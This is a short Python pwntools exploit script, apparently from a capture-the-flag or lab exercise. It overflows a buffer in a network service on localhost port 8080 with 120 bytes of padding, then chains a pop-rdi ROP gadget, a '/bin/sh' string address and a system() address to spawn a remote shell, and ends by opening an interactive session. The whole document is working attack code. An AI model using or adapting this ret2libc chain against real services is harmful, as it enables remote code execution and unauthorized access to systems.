
#!/usr/bin/env python

from struct import *
from pwn import *

username = "doesntmatter\n"
payload = ""
payload += "A"*120
#payload += "BBBBBB"
#ropgadget, pop rdi; ret;
payload += p64(0x00000000004006cb)

#bin/sh
payload += p64(0x40086f)
#need padding (this prints out the library version)
#to avoid a strange error
payload += p64(0x7ffff7a05ca0)
#system()
payload += p64(0x7ffff7a33440)

s = remote("127.0.0.1", 8080)
print s.recv()
s.send(username)
print s.recv()
s.send(payload)
s.interactive()
print s.recvuntil(' ', drop = True)


#s.recvline()
